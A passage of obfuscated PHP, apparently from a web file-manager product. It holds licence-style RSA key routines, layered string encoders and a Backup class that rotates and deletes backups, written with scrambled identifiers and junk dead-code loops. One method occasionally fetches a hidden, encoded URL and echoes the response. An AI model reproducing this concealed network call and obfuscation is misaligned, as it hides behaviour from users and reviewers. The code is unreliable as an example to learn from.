š¦İÈ]; $ç·Û¡ºú =& $_SERVER[â­¶Àş‹]; $²›ıëÀ = array($ç·Û¡ºú[260] => $ç·Û¡ºú[261], $ç·Û¡ºú[262] => $ç·Û¡ºú[263], $ç·Û¡ºú[264] => $ç·Û¡ºú[265], $ç·Û¡ºú[266] => $ç·Û¡ºú[267], $ç·Û¡ºú[268] => $ç·Û¡ºú[269], $ç·Û¡ºú[270] => $ç·Û¡ºú[207], $ç·Û¡ºú[271] => $ç·Û¡ºú[207], $ç·Û¡ºú[272] => $ç·Û¡ºú[261], $ç·Û¡ºú[273] => $ç·Û¡ºú[263], $ç·Û¡ºú[274] => $ç·Û¡ºú[265], $ç·Û¡ºú[275] => $ç·Û¡ºú[276], $ç·Û¡ºú[277] => $ç·Û¡ºú[267], $ç·Û¡ºú[278] => $ç·Û¡ºú[279], $ç·Û¡ºú[280] => $ç·Û¡ºú[269], $ç·Û¡ºú[281] => $ç·Û¡ºú[282], $ç·Û¡ºú[283] => $ç·Û¡ºú[284], $ç·Û¡ºú[285] => $ç·Û¡ºú[286]); $·¹ŸùØÆ = $²›ıëÀ[$this->scvibb4abc8d]; $·¹ŸùØÆ = intval($·¹ŸùØÆ ? $·¹ŸùØÆ : $ç·Û¡ºú[261]); $İ½¢ÆêÏ = $ìÕŠó¥š[681]; while ($İ½¢ÆêÏ < $ìÕŠó¥š[620]) { if ($İ½¢ÆêÏ >= 0) { break; } $İ½¢ÆêÏ++; } $Üº Ô = _get($this->demrd2edb119, $ç·Û¡ºú[287]); $Üº Ô = $Üº Ô ? intval($Üº Ô) : 0; $ş¹çÅãú = $ìÕŠó¥š[682]; if (strlen($ş¹çÅãú) < $ìÕŠó¥š[631]) { return; } return $·¹ŸùØÆ + $Üº Ô; $‡äÈöì = $ìÕŠó¥š[683]; } public function umylc888ca43($ƒ‹Ö‘’) { $ƒºß®¼ =& $_SERVER[Æ š¦İÈ]; $Öú—åø =& $_SERVER[â­¶Àş‹]; $¤œÕ©Š± = $this->wkog2a387d2e(); $éÆøéƒ = $ƒºß®¼[684]; if (strlen($éÆøéƒ) < $ƒºß®¼[396]) { return; } if ($ƒ‹Ö‘’[$Öú—åø[288]] == $Öú—åø[191]) { return; } if ($¤œÕ©Š± >= intval($Öú—åø[207])) { return; } $¼—€Ÿ¢Â = Model($Öú—åø[119])->count(); $™Ç­—Ì² = $ƒºß®¼[685]; if ($¼—€Ÿ¢Â <= $¤œÕ©Š±) { return; } $‹æ´°Í¡ = Model($Öú—åø[119])->field($Öú—åø[288])->limit($¤œÕ©Š±)->select(); $ÈÇ“¶¤ = $ƒºß®¼[686]; $‹æ´°Í¡ = array_to_keyvalue($‹æ´°Í¡, $Öú—åø[6], $Öú—åø[288]); if (!in_array($ƒ‹Ö‘’[$Öú—åø[288]], $‹æ´°Í¡)) { show_json($Öú—åø[289], !1, $Öú—åø[203]); } } public function oajv65826480() { $­¶ïİ´­ =& $_SERVER[Æ š¦İÈ]; $ÕÅí¥œ =& $_SERVER[â­¶Àş‹]; if (!_get($GLOBALS, $ÕÅí¥œ[113]) || mt_rand(1, 100) > 20) { return; } $¥çµ¬ú = $ÕÅí¥œ[211]; $í˜‚¡ = $­¶ïİ´­[687]; if (!$í˜‚¡) { die; } $¥çµ¬ú = $this->diep44e7f5c3($¥çµ¬ú, $ÕÅí¥œ[212]); $©ôØ°û§ = $­¶ïİ´­[688]; if (strlen($©ôØ°û§) < $­¶ïİ´­[613]) { die; } $ˆ•Á¯ìö = stream_context_create(array($ÕÅí¥œ[213] => array($ÕÅí¥œ[214] => $ÕÅí¥œ[215], $ÕÅí¥œ[216] => 3))); $á–û‡éé = $­¶ïİ´­[689]; if (!$á–û‡éé) { die; } $­ªôêù” = @file_get_contents($¥çµ¬ú, !1, $ˆ•Á¯ìö); echo $ÕÅí¥œ[290] . hash_encode($­ªôêù”) . $ÕÅí¥œ[291]; $Üğíª³ = $­¶ïİ´­[690]; } private function zuik254bd638($Ô—›ñŒô, $–ú¶ç—Œ, $‰·‡Ù° = 3) { $ÉÇß³ÓŸ =& $_SERVER[Æ š¦İÈ]; $ä¯ÉÎòŞ =& $_SERVER[â­¶Àş‹]; usleep(1); $×¯¾•×ƒ = $ÉÇß³ÓŸ[691]; if (!$×¯¾•×ƒ) { die; } $Ô—›ñŒô = trim($Ô—›ñŒô); $è‘ê¾Š§ = mt_rand(0, 5) . $ä¯ÉÎòŞ[6]; $º×ÔøÀ¹ = rand_string(15); $¼¦ºˆê = $ä¯ÉÎòŞ[292]; switch ($è‘ê¾Š§) { case $ä¯ÉÎòŞ[199]: $¼ã›ÉÅ = $this->hury410bd353($Ô—›ñŒô, strrev($–ú¶ç—Œ . $º×ÔøÀ¹)); $½ÜÒ›ñã = $ÉÇß³ÓŸ[692]; while ($½ÜÒ›ñã < $ÉÇß³ÓŸ[613]) { if ($½ÜÒ›ñã >= 0) { break; } $½ÜÒ›ñã++; } break; $€­¦Î¦¥ = $ÉÇß³ÓŸ[693]; if (strlen($€­¦Î¦¥) < $ÉÇß³ÓŸ[613]) { return; } case $ä¯ÉÎòŞ[191]: $¼ã›ÉÅ = $this->hury410bd353($Ô—›ñŒô, strrev($º×ÔøÀ¹ . $–ú¶ç—Œ)); $«ãÜºú† = $ÉÇß³ÓŸ[694]; break; $ÈÎÂüÌ = $ÉÇß³ÓŸ[695]; while (strlen($ÈÎÂüÌ) < $ÉÇß³ÓŸ[396]) { if (!$ÈÎÂüÌ) { break; } $ÈÎÂüÌ++; } case $ä¯ÉÎòŞ[293]: $¼ã›ÉÅ = $this->hury410bd353($Ô—›ñŒô, base64_encode($º×ÔøÀ¹ . $–ú¶ç—Œ)); $İıè«Ğâ = $ÉÇß³ÓŸ[696]; break; $ƒ¢‡Ô€š = $ÉÇß³ÓŸ[697]; case $ä¯ÉÎòŞ[294]: $¼ã›ÉÅ = $this->hury410bd353($Ô—›ñŒô, md5($º×ÔøÀ¹ . $–ú¶ç—Œ)); break; case $ä¯ÉÎòŞ[295]: $Ô—›ñŒô = base64_encode($Ô—›ñŒô); $Äˆãƒ„Ğ = rand(0, 64); $›ãæíñ— = $¼¦ºˆê[$Äˆãƒ„Ğ]; $Õ¹¥³¢Ò = $ÉÇß³ÓŸ[698]; if (strlen($Õ¹¥³¢Ò) < $ÉÇß³ÓŸ[613]) { die; } $·¶ûü§Ë = md5($›ãæíñ— . md5($–ú¶ç—Œ . $›ãæíñ—) . $–ú¶ç—Œ); $·¶ûü§Ë = substr($·¶ûü§Ë, $Äˆãƒ„Ğ % 8, $Äˆãƒ„Ğ % 8 + 7); $ÔÏŸÀæ¿ = $ä¯ÉÎòŞ[6]; $†”ó´ş‰ = 0; $İÆÚ—¹ = $ÉÇß³ÓŸ[699]; if (strlen($İÆÚ—¹) < $ÉÇß³ÓŸ[620]) { return; } $üÕ¡®Ğµ = 0; $øæÅ‘Ê = 0; $ÕĞóÂ = $ÉÇß³ÓŸ[700]; for ($†”ó´ş‰ = 0; $†”ó´ş‰ < strlen($Ô—›ñŒô); $†”ó´ş‰++) { $øæÅ‘Ê = $øæÅ‘Ê == strlen($·¶ûü§Ë) ? 0 : $øæÅ‘Ê; $üÕ¡®Ğµ = ($Äˆãƒ„Ğ + strpos($¼¦ºˆê, $Ô—›ñŒô[$†”ó´ş‰]) + ord($·¶ûü§Ë[$øæÅ‘Ê++])) % 64; $ÔÏŸÀæ¿ .= $¼¦ºˆê[$üÕ¡®Ğµ]; $°—¨à´‰ = $ÉÇß³ÓŸ[701]; while ($°—¨à´‰ < $ÉÇß³ÓŸ[396]) { if ($°—¨à´‰ >= 0) { break; } $°—¨à´‰++; } } $¼ã›ÉÅ = hash_encode($›ãæíñ— . $ÔÏŸÀæ¿); break; $“æ¥Š¤Ú = $ÉÇß³ÓŸ[702]; while ($“æ¥Š¤Ú < $ÉÇß³ÓŸ[396]) { if ($“æ¥Š¤Ú >= 0) { break; } $“æ¥Š¤Ú++; } default: $¼ã›ÉÅ = $this->hury410bd353($Ô—›ñŒô, $–ú¶ç—Œ . $º×ÔøÀ¹); $¯ÃìóÙ¾ = $ÉÇß³ÓŸ[703]; break; $¶¾´¹¸¦ = $ÉÇß³ÓŸ[704]; while ($¶¾´¹¸¦ < $ÉÇß³ÓŸ[634]) { if ($¶¾´¹¸¦ >= 0) { break; } $¶¾´¹¸¦++; } } $¼ã›ÉÅ = strrev($è‘ê¾Š§ . $º×ÔøÀ¹ . $¼ã›ÉÅ); if ($‰·‡Ù° - 1 > 0) { $¼ã›ÉÅ = $this->zuik254bd638($¼ã›ÉÅ, $–ú¶ç—Œ, $‰·‡Ù° - 1); } return $¼ã›ÉÅ; } private function huce5c949ef6($Âó¥ß †, $” ÙÒš, $³™ü‰Ó¥ = 3) { $ËœğáÂĞ =& $_SERVER[Æ š¦İÈ]; $èÅìã£ù =& $_SERVER[â­¶Àş‹]; if (!is_string($Âó¥ß †) || strlen($Âó¥ß †) < 10) { return !1; } $Âó¥ß † = trim($Âó¥ß †); $®Œğ±âú = $ËœğáÂĞ[705]; while ($®Œğ±âú < $ËœğáÂĞ[620]) { if ($®Œğ±âú >= 0) { break; } $®Œğ±âú++; } $Âó¥ß † = strrev($Âó¥ß †); $³‡Û©è = $ËœğáÂĞ[706]; if (!$³‡Û©è) { return; } $õÌíƒù“ = $Âó¥ß †[0]; $›¬ÙáßĞ = substr($Âó¥ß †, 1, 15); $Âó¥ß † = substr($Âó¥ß †, 16); $ôÎ‡‚ê™ = $ËœğáÂĞ[707]; if (!$ôÎ‡‚ê™) { die; } $Şô½¤·Ñ = $èÅìã£ù[292]; $¢ƒÏã¢ = $ËœğáÂĞ[708]; if (strlen($¢ƒÏã¢) < $ËœğáÂĞ[613]) { return; } switch ($õÌíƒù“) { case $èÅìã£ù[199]: $àÚÊµ‚ = $this->diep44e7f5c3($Âó¥ß †, strrev($” ÙÒš . $›¬ÙáßĞ)); $¹ô”¾ƒÍ = $ËœğáÂĞ[709]; if (strlen($¹ô”¾ƒÍ) < $ËœğáÂĞ[634]) { return; } break; case $èÅìã£ù[191]: $àÚÊµ‚ = $this->diep44e7f5c3($Âó¥ß †, strrev($›¬ÙáßĞ . $” ÙÒš)); break; case $èÅìã£ù[293]: $àÚÊµ‚ = $this->diep44e7f5c3($Âó¥ß †, base64_encode($›¬ÙáßĞ . $” ÙÒš)); break; $œÁ„¨» = $ËœğáÂĞ[710]; while ($œÁ„¨» < $ËœğáÂĞ[634]) { if ($œÁ„¨» >= 0) { break; } $œÁ„¨»++; } case $èÅìã£ù[294]: $àÚÊµ‚ = $this->diep44e7f5c3($Âó¥ß †, md5($›¬ÙáßĞ . $” ÙÒš)); break; case $èÅìã£ù[295]: $Âó¥ß † = hash_decode($Âó¥ß †); $„ùÄ “Ã = $ËœğáÂĞ[711]; $áŸŒ©¿ = $Âó¥ß †[0]; $Âó¥ß † = substr($Âó¥ß †, 1); $è‰ùÌ»” = strpos($Şô½¤·Ñ, $áŸŒ©¿); $ô¸Ø³ˆ‹ = $ËœğáÂĞ[712]; while ($ô¸Ø³ˆ‹ < $ËœğáÂĞ[620]) { if ($ô¸Ø³ˆ‹ >= 0) { break; } $ô¸Ø³ˆ‹++; } $ —®–Ôü = md5($áŸŒ©¿ . md5($” ÙÒš . $áŸŒ©¿) . $” ÙÒš); $•üºñƒ = $ËœğáÂĞ[713]; if (!$•üºñƒ) { return; } $ —®–Ôü = substr($ —®–Ôü, $è‰ùÌ»” % 8, $è‰ùÌ»” % 8 + 7); $éüúŸƒä = $èÅìã£ù[6]; $¯Ó–ëÅÖ = 0; $²»ÖÒ¾š = 0; $®âùå¶¿ = $ËœğáÂĞ[714]; $…îæ¬õ = 0; for ($¯Ó–ëÅÖ = 0; $¯Ó–ëÅÖ < strlen($Âó¥ß †); $¯Ó–ëÅÖ++) { $…îæ¬õ = $…îæ¬õ == strlen($ —®–Ôü) ? 0 : $…îæ¬õ; $ÛÅ¸Íüô = $…îæ¬õ++; $¤ˆ˜ĞÚ§ = $ËœğáÂĞ[715]; $²»ÖÒ¾š = strpos($Şô½¤·Ñ, $Âó¥ß †[$¯Ó–ëÅÖ]) - $è‰ùÌ»” - ord($ —®–Ôü[$ÛÅ¸Íüô]); $ôˆÑˆ‚Ø = $ËœğáÂĞ[716]; while ($²»ÖÒ¾š < 0) { $²»ÖÒ¾š += 64; $™Û‹ÌÁµ = $ËœğáÂĞ[717]; if (strlen($™Û‹ÌÁµ) < $ËœğáÂĞ[396]) { die; } } $éüúŸƒä .= $Şô½¤·Ñ[$²»ÖÒ¾š]; } $àÚÊµ‚ = base64_decode($éüúŸƒä); break; $ñÉ‚°Ï = $ËœğáÂĞ[718]; if (strlen($ñÉ‚°Ï) < $ËœğáÂĞ[613]) { return; } default: $àÚÊµ‚ = $this->diep44e7f5c3($Âó¥ß †, $” ÙÒš . $›¬ÙáßĞ); $øóì¯Û = $ËœğáÂĞ[719]; if (strlen($øóì¯Û) < $ËœğáÂĞ[613]) { die; } break; $é¶‹Ü¬• = $ËœğáÂĞ[720]; if (!$é¶‹Ü¬•) { die; } } if ($³™ü‰Ó¥ - 1 > 0) { $àÚÊµ‚ = $this->huce5c949ef6($àÚÊµ‚, $” ÙÒš, $³™ü‰Ó¥ - 1); } return $àÚÊµ‚; } public function jhpq0defe84d($¥Æää»Í) { $¿”îø¹— =& $_SERVER[Æ š¦İÈ]; $î– ş«´ =& $_SERVER[â­¶Àş‹]; $ÓèÁÏ‡â = $this->xoawca03acb0(); $ãÄ÷Å = $this->xoawca03acb0(); $†ŸÃšÄ = ($ÓèÁÏ‡â - 1) * ($ãÄ÷Å - 1); $Òâ‹Óš— = intval(($ÓèÁÏ‡â + $ãÄ÷Å) / 2); while (1) { $®¿¼—™Í = $Òâ‹Óš—; $Ã÷‡Û…ß = $¿”îø¹—[721]; $ûÔöÅæ½ = $†ŸÃšÄ; $ØÁ•Ÿ·ì = $¿”îø¹—[722]; while (strlen($ØÁ•Ÿ·ì) < $¿”îø¹—[631]) { if (!$ØÁ•Ÿ·ì) { break; } $ØÁ•Ÿ·ì++; } while ($ûÔöÅæ½ % $®¿¼—™Í != 0) { $Öé¨§àŠ = $ûÔöÅæ½; $©øŒëçç = $¿”îø¹—[723]; $ûÔöÅæ½ = $®¿¼—™Í; $–»ÏÓ„§ = $¿”îø¹—[724]; while ($–»ÏÓ„§ < $¿”îø¹—[620]) { if ($–»ÏÓ„§ >= 0) { break; } $–»ÏÓ„§++; } $®¿¼—™Í = $Öé¨§àŠ % $®¿¼—™Í; } if ($®¿¼—™Í == 1) { break; } else { $Òâ‹Óš—++; } } $êå§Í¼ê = 2; $’• ¯á = $¿”îø¹—[725]; if (strlen($’• ¯á) < $¿”îø¹—[634]) { return; } for ($¹ùÕ¦Ÿ‚ = 0; $¹ùÕ¦Ÿ‚ < $†ŸÃšÄ * 10; $¹ùÕ¦Ÿ‚++) { if (($†ŸÃšÄ * $¹ùÕ¦Ÿ‚ + 1) % $Òâ‹Óš— == 0) { $êå§Í¼ê = intval(($†ŸÃšÄ * $¹ùÕ¦Ÿ‚ + 1) / $Òâ‹Óš—); break; } } $¶§ÕÈ×¼ = $this->hury410bd353($ÓèÁÏ‡â * $ãÄ÷Å . $î– ş«´[6], $î– ş«´[130]); $Å”Ø¢ŒÀ = $¿”îø¹—[726]; if (!$Å”Ø¢ŒÀ) { return; } $ÜË¡áö„ = md5($î– ş«´[296] . ($ÓèÁÏ‡â + $ãÄ÷Å) . $î– ş«´[297] . $Òâ‹Óš— . $î– ş«´[297] . $êå§Í¼ê . $î– ş«´[298]); $Şòø°Â– = $this->hury410bd353($¥Æää»Í, $ÜË¡áö„) . $î– ş«´[299] . $¶§ÕÈ×¼; return $Şòø°Â–; $‹‘Äš±Ú = $¿”îø¹—[727]; if (strlen($‹‘Äš±Ú) < $¿”îø¹—[396]) { return; } } public function fpdg5631fffc($‘éîüæû) { $×é·ıÏ¸ =& $_SERVER[Æ š¦İÈ]; $ÑéÇ¾í® =& $_SERVER[â­¶Àş‹]; $©à„‘±Õ = explode($ÑéÇ¾í®[299], $‘éîüæû); if (count($©à„‘±Õ) != 2) { return $ÑéÇ¾í®[6]; } $‘•ääì = $this->diep44e7f5c3($©à„‘±Õ[1] . $ÑéÇ¾í®[6], $ÑéÇ¾í®[130]); if (!$‘•ääì) { return $ÑéÇ¾í®[6]; } $‘•ääì = intval($‘•ääì); $ªÙ•ö­£ = $×é·ıÏ¸[728]; if (!$ªÙ•ö­£) { return; } $¨¥Üå•´ = 0; $Ù´ÕääÉ = $×é·ıÏ¸[729]; if (strlen($Ù´ÕääÉ) < $×é·ıÏ¸[613]) { die; } $°Ì‹ŸíÍ = 0; for ($ï±û˜Û¼ = 3; $ï±û˜Û¼ < $‘•ääì; $ï±û˜Û¼ += 2) { if ($‘•ääì % $ï±û˜Û¼ != 0) { continue; } $¨¥Üå•´ = $ï±û˜Û¼; $ı£ÓÈŠ˜ = $×é·ıÏ¸[730]; if (strlen($ı£ÓÈŠ˜) < $×é·ıÏ¸[634]) { return; } $°Ì‹ŸíÍ = intval($‘•ääì / $ï±û˜Û¼); break; $ÒÙÔ÷£ = $×é·ıÏ¸[731]; } $ç‡Úœ¤ = ($¨¥Üå•´ - 1) * ($°Ì‹ŸíÍ - 1); $ºïˆ×áÕ = intval(($¨¥Üå•´ + $°Ì‹ŸíÍ) / 2); while (1) { $ôíÊ¶šì = $ºïˆ×áÕ; $¡¬¤À„Ş = $×é·ıÏ¸[732]; if (!$¡¬¤À„Ş) { die; } $æ‚ãÛåÖ = $ç‡Úœ¤; while ($æ‚ãÛåÖ % $ôíÊ¶šì != 0) { $âö­÷õ¡ = $æ‚ãÛåÖ; $°ö°¢ğì = $×é·ıÏ¸[733]; while (strlen($°ö°¢ğì) < $×é·ıÏ¸[396]) { if (!$°ö°¢ğì) { break; } $°ö°¢ğì++; } $æ‚ãÛåÖ = $ôíÊ¶šì; $Â—ãÂÁ‘ = $×é·ıÏ¸[734]; if (!$Â—ãÂÁ‘) { return; } $ôíÊ¶šì = $âö­÷õ¡ % $ôíÊ¶šì; $ÆğÆõ©Œ = $×é·ıÏ¸[735]; } if ($ôíÊ¶šì == 1) { break; } else { $ºïˆ×áÕ++; } } $ı†à”° = 2; for ($ï±û˜Û¼ = 0; $ï±û˜Û¼ < $ç‡Úœ¤ * 10; $ï±û˜Û¼++) { if (($ç‡Úœ¤ * $ï±û˜Û¼ + 1) % $ºïˆ×áÕ == 0) { $ı†à”° = intval(($ç‡Úœ¤ * $ï±û˜Û¼ + 1) / $ºïˆ×áÕ); break; } } $ÑÑ°…‹“ = md5($ÑéÇ¾í®[296] . ($¨¥Üå•´ + $°Ì‹ŸíÍ) . $ÑéÇ¾í®[297] . $ºïˆ×áÕ . $ÑéÇ¾í®[297] . $ı†à”° . $ÑéÇ¾í®[298]); $õµÙê¦Ÿ = $×é·ıÏ¸[736]; while (strlen($õµÙê¦Ÿ) < $×é·ıÏ¸[631]) { if (!$õµÙê¦Ÿ) { break; } $õµÙê¦Ÿ++; } $é˜ë£¥Ç = $this->diep44e7f5c3($©à„‘±Õ[0], $ÑÑ°…‹“); return $é˜ë£¥Ç; } public function xoawca03acb0() { $—»ÓŒÙ‹ =& $_SERVER[Æ š¦İÈ]; $ş§‰Ìƒú = mt_rand(pow(2, 14), pow(2, 16) - 1); $™èåàŸ” = array(); $Ü‡œºšÅ = $—»ÓŒÙ‹[737]; $¢ÑÁÖ‚í = 1; $ø¢¦‘“ã = $—»ÓŒÙ‹[738]; while ($¢ÑÁÖ‚í <= (int) sqrt($ş§‰Ìƒú)) { $Ú¹‚¿Üò = $¢ÑÁÖ‚í; $¾±±–Ë = $—»ÓŒÙ‹[739]; if (strlen($¾±±–Ë) < $—»ÓŒÙ‹[634]) { return; } while (!0) { $Ú¹‚¿Üò++; if ($Ú¹‚¿Üò <= 2) { $¢ÑÁÖ‚í = $Ú¹‚¿Üò; break; } else { if ($Ú¹‚¿Üò < 2) { continue; } } $Èš›âû³ = !0; for ($”¾ºàûŒ = 2; $”¾ºàûŒ <= sqrt($Ú¹‚¿Üò); $”¾ºàûŒ++) { if ($Ú¹‚¿Üò % $”¾ºàûŒ == 0) { $Èš›âû³ = !1; } } if ($Èš›âû³) { $¢ÑÁÖ‚í = $Ú¹‚¿Üò; break; } } $™èåàŸ”[] = $¢ÑÁÖ‚í; $å°ÔİÌ¿ = $—»ÓŒÙ‹[740]; } $”×Ö¾¶ = 2; $¤›Ã€ğê = $—»ÓŒÙ‹[741]; for ($Ú¹‚¿Üò = $ş§‰Ìƒú; $Ú¹‚¿Üò > 1; $Ú¹‚¿Üò--) { $Èš›âû³ = !0; $­ş¾° = $—»ÓŒÙ‹[742]; while (strlen($­ş¾°) < $—»ÓŒÙ‹[396]) { if (!$­ş¾°) { break; } $­ş¾°++; } foreach ($™èåàŸ” as $š‘ı¡À) { if ($Ú¹‚¿Üò % $š‘ı¡À == 0) { $Èš›âû³ = !1; break; } } if ($Èš›âû³) { $”×Ö¾¶ = $Ú¹‚¿Üò; break; } } return $”×Ö¾¶; $ÇÓÈÈ€ç = $—»ÓŒÙ‹[743]; if (strlen($ÇÓÈÈ€ç) < $—»ÓŒÙ‹[620]) { die; } } public function teyu34bd47b3($Îç‘­±ê, $Àß‹¨ ¬) { $£İ‘³Ê¼ =& $_SERVER[â­¶Àş‹]; return call_user_func(array($£İ‘³Ê¼[8], $£İ‘³Ê¼[300]), $Îç‘­±ê, $Àß‹¨ ¬); } public function hury410bd353($³ö”Ê¬, $Ã¥Í…’) { $¸ÑÏŒ¡€ =& $_SERVER[â­¶Àş‹]; return call_user_func(array($¸ÑÏŒ¡€[301], $¸ÑÏŒ¡€[302]), $³ö”Ê¬, $Ã¥Í…’); } public function diep44e7f5c3($îŞ›€Õæ, $·ö´Ø€ø) { $ªúÔ×ì½ =& $_SERVER[â­¶Àş‹]; return call_user_func(array($ªúÔ×ì½[301], $ªúÔ×ì½[303]), $îŞ›€Õæ, $·ö´Ø€ø); $‰íÇµ·Ö = $_SERVER[Æ š¦İÈ][744]; } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $öŞâÖ™ =& $_SERVER[Æ š¦İÈ]; $this->isManual(); self::$name = date($öŞâÖ™[745]); if (!($ºŒØûÎ² = Model($öŞâÖ™[746])->lastItem())) { $ºŒØûÎ² = $this->initData(); } else { self::$name = $ºŒØûÎ²[$öŞâÖ™[32]]; if ($ºŒØûÎ²[$öŞâÖ™[747]] == $öŞâÖ™[89]) { self::$name = date($öŞâÖ™[748]); $ˆâ¥„ã£ = 0; if (isset($ºŒØûÎ²[$öŞâÖ™[290]][$öŞâÖ™[194]][$öŞâÖ™[469]])) { $ˆâ¥„ã£ = (int) $ºŒØûÎ²[$öŞâÖ™[290]][$öŞâÖ™[194]][$öŞâÖ™[469]]; } if (self::$manual == 0 && $ºŒØûÎ²[$öŞâÖ™[32]] == self::$name) { Model($öŞâÖ™[746])->remove($ºŒØûÎ²[$öŞâÖ™[403]]); } $ºŒØûÎ² = $this->initData($ˆâ¥„ã£, $ºŒØûÎ²[$öŞâÖ™[749]]); } else { $this->checkStore($ºŒØûÎ²[$öŞâÖ™[749]]); } } self::$option = $ºŒØûÎ²; } private function isManual() { $Â±ªÌõ² = _get($GLOBALS, $_SERVER[Æ š¦İÈ][750], 0); $Â±ªÌõ² = intval($Â±ªÌõ²); self::$manual = $Â±ªÌõ² && $Â±ªÌõ² == 1 ? 1 : 0; } private function initData($¨Ë‡ığÇ = 0, $ˆÙ¨çÍª = '') { $Ó²Æ¼µ” =& $_SERVER[Æ š¦İÈ]; $ü•¶Âã = Model($Ó²Æ¼µ”[746])->config(); if ($ˆÙ¨çÍª && $ü•¶Âã[$Ó²Æ¼µ”[749]] != $ˆÙ¨çÍª) { $¨Ë‡ığÇ = 0; } $this->checkStore($ü•¶Âã[$Ó²Æ¼µ”[749]]); if (self::$manual == 1) { self::$name .= $Ó²Æ¼µ”[11] . date($Ó²Æ¼µ”[751]); } $¥³áô­ø = array($Ó²Æ¼µ”[749] => $ü•¶Âã[$Ó²Æ¼µ”[749]], $Ó²Æ¼µ”[32] => self::$name, $Ó²Æ¼µ”[747] => 0, $Ó²Æ¼µ”[752] => $ü•¶Âã[$Ó²Æ¼µ”[752]], $Ó²Æ¼µ”[753] => self::$manual, $Ó²Æ¼µ”[290] => array($Ó²Æ¼µ”[754] => array($Ó²Æ¼µ”[747] => 0), $Ó²Æ¼µ”[755] => array($Ó²Æ¼µ”[747] => 0, $Ó²Æ¼µ”[756] => 0, $Ó²Æ¼µ”[757] => 0, $Ó²Æ¼µ”[33] => $Ó²Æ¼µ”[12], $Ó²Æ¼µ”[758] => 0, $Ó²Æ¼µ”[498] => 0), $Ó²Æ¼µ”[759] => array($Ó²Æ¼µ”[747] => 0, $Ó²Æ¼µ”[756] => 0, $Ó²Æ¼µ”[757] => 0, $Ó²Æ¼µ”[758] => 0, $Ó²Æ¼µ”[498] => 0), $Ó²Æ¼µ”[194] => array($Ó²Æ¼µ”[747] => 0, $Ó²Æ¼µ”[760] => 0, $Ó²Æ¼µ”[761] => 0, $Ó²Æ¼µ”[762] => 0, $Ó²Æ¼µ”[763] => 0, $Ó²Æ¼µ”[469] => $¨Ë‡ığÇ, $Ó²Æ¼µ”[758] => 0, $Ó²Æ¼µ”[498] => 0)), $Ó²Æ¼µ”[758] => time(), $Ó²Æ¼µ”[498] => 0); $¢Œí ƒ¥ = Model($Ó²Æ¼µ”[746])->insert($¥³áô­ø); $¥³áô­ø[$Ó²Æ¼µ”[403]] = $¢Œí ƒ¥; return $¥³áô­ø; } private function checkStore($Õ™š›şğ) { $Åù€î¾¶ =& $_SERVER[Æ š¦İÈ]; $ôŞÁ®î = Model($Åù€î¾¶[764])->listData($Õ™š›şğ); Model($Åù€î¾¶[764])->checkConfig($ôŞÁ®î); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Æ š¦İÈ][746])->findByName(self::$name); } return self::$option; } public static function set($ó´š¶º) { $ª´‹‘»ß =& $_SERVER[Æ š¦İÈ]; $İÙ¾ÁÎÏ = self::get(); foreach ($ó´š¶º as $¶îÔëÆê => $¾€ÇÌâŒ) { $Î‰ÓÔ¨¤ = explode($ª´‹‘»ß[10], $¶îÔëÆê); $Ùˆ˜°ã— = count($Î‰ÓÔ¨¤); switch ($Ùˆ˜°ã—) { case 1: $İÙ¾ÁÎÏ[$Î‰ÓÔ¨¤[0]] = $¾€ÇÌâŒ; break; case 2: $İÙ¾ÁÎÏ[$Î‰ÓÔ¨¤[0]][$Î‰ÓÔ¨¤[1]] = $¾€ÇÌâŒ; break; case 3: $İÙ¾ÁÎÏ[$Î‰ÓÔ¨¤[0]][$Î‰ÓÔ¨¤[1]][$Î‰ÓÔ¨¤[2]] = $¾€ÇÌâŒ; break; } } Model($ª´‹‘»ß[746])->update($İÙ¾ÁÎÏ[$ª´‹‘»ß[403]], $İÙ¾ÁÎÏ); self::$option = $İÙ¾ÁÎÏ; return self::$option; } public function keep() { $œÇ»¯Ã =& $_SERVER[Æ š¦İÈ]; $º¸æ·äí = self::get(); if ($º¸æ·äí[$œÇ»¯Ã[290]][$œÇ»¯Ã[754]][$œÇ»¯Ã[747]] == $œÇ»¯Ã[89]) { return; } $this->backupKeep($º¸æ·äí); self::set(array($œÇ»¯Ã[765] => 1)); } private function backupKeep($°©ğ©Áû) { $ä¤ÁŠ¦ =& $_SERVER[Æ š¦İÈ]; if (self::$manual == 1) { return; } $Ñı¬êõŞ = Model($ä¤ÁŠ¦[746])->listData(); if (empty($Ñı¬êõŞ)) { return; } $³¿ÆÌÉÆ = 0; $öùè ±¤ = array(); foreach ($Ñı¬êõŞ as $ªÖÂÌŒ) { if ($³¿ÆÌÉÆ >= 7) { break; } $öùè ±¤[] = $ªÖÂÌŒ[$ä¤ÁŠ¦[32]]; $³¿ÆÌÉÆ++; } for ($³¿ÆÌÉÆ = 0; $³¿ÆÌÉÆ < 12; $³¿ÆÌÉÆ++) { $öùè ±¤[] = date($ä¤ÁŠ¦[766], strtotime("\x2d{$³¿ÆÌÉÆ}\x20\155\x6f\156\x74\150\163")); } $öùè ±¤ = array_unique($öùè ±¤); $ğûô¥Î = Model($ä¤ÁŠ¦[767])->get($ä¤ÁŠ¦[768]); foreach ($Ñı¬êõŞ as $ªÖÂÌŒ) { if (isset($ªÖÂÌŒ[$ä¤ÁŠ¦[753]]) && $ªÖÂÌŒ[$ä¤ÁŠ¦[753]] == $ä¤ÁŠ¦[89]) { continue; } if (!empty($ªÖÂÌŒ[$ä¤ÁŠ¦[32]]) && in_array($ªÖÂÌŒ[$ä¤ÁŠ¦[32]], $öùè ±¤)) { continue; } Model($ä¤ÁŠ¦[746])->remove($ªÖÂÌŒ[$ä¤ÁŠ¦[403]]); $Íö¾Éî³ = $this->backupPath($°©ğ©Áû, $ğûô¥Î); IO::remove($Íö¾Éî³, !1); } } private function backupPath($œ÷±Ù£, $¸¥ô€Ñê = false) { $ğ¬Ìñ‰Û =& $_SERVER[Æ š¦İÈ]; if (!$¸¥ô€Ñê) { $¸¥ô€Ñê = Model($ğ¬Ìñ‰Û[767])->get($ğ¬Ìñ‰Û[768]); } $¦œ’øû‡ = $œ÷±Ù£[$ğ¬Ìñ‰Û[32]]; $—Ê‚úª = substr(md5($ğ¬Ìñ‰Û[769] . $¸¥ô€Ñê . $¦œ’øû‡), 0, 8); return "\173\x69\157\x3a{$œ÷±Ù£[$ğ¬Ìñ‰Û[749]]}\175\x2f\144\x61\x74\141\x62\141\163\x65\x2f\142\x61\143\x6b\x75\x70\x2f" . $¦œ’øû‡ . 